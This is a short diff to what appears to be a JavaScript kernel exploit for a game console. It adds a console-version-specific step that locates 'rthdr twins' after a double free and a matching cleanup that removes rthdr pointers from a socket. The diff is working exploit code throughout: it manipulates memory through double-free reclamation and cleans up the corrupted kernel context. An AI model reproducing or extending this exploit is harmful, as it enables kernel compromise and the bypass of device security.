@@ -928,6 +928,15 @@ function double_free_reqs1() {
   // we reclaim first since the sanity checking here is longer which makes it
   // more likely that we have another process claim the memory
   try {
+    if (version.console === 5) {
+      logger.info('Looking for rthdr twins... !!');
+
+      // RESTORE: double freed 0x80 block has been reclaimed with harmless data
+      find_rthdr_twins();
+
+      logger.info(`Found rthdr twins: ${rthdr_twins} !!`);
+    }
+
     logger.info('Make pktopts twins...');
 
     // RESTORE: double freed memory has been reclaimed with harmless data
@@ -1146,6 +1155,10 @@ async function exploit_main() {
 
     // Remove rthdr pointers
     remove_rthdr_from_so(pktopts_twins[1]);
+
+    if (version.console === 5) {
+      remove_rthdr_from_so(rthdr_twins[0]);
+    }
 
     logger.info('Corrupted context cleanup completed !!');
   } finally {
